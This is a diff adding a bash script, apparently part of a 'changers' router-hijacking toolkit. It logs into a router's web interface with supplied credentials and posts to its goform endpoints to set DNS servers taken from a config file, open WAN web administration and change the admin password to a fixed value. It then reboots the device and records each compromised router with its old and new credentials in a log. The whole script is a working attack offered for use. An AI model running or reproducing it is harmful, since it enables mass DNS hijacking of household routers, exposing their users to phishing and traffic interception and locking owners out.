@@ -1,0 +1,16 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+
+${CURL} -u "$USERNAME:$PASSWORD" -d "dnsMode=dnsManual&dns1=${DNS1}&dns2=${DNS2}&webWanAccess=ON" "http://$HOSTNAME/goform/formWanTcpipSetup" -d "username=admin&newpass=${PASSWD}&confpass=${PASSWD}" "http://$HOSTNAME/goform/formPasswordSetup" -d "reboot=Confirmar" "http://$HOSTNAME/goform/formReboot" 1>/dev/null 2>/dev/null
+	
+echo "[+] modificado, http://${HOSTNAME} ${USERNAME}:${PASSWORD} [AP-ROUTER]"
+echo "http://${HOSTNAME} (${USERNAME}:${PASSWORD} => admin:${PASSWD}) [AP-ROUTER]" >> logs/modificados.log
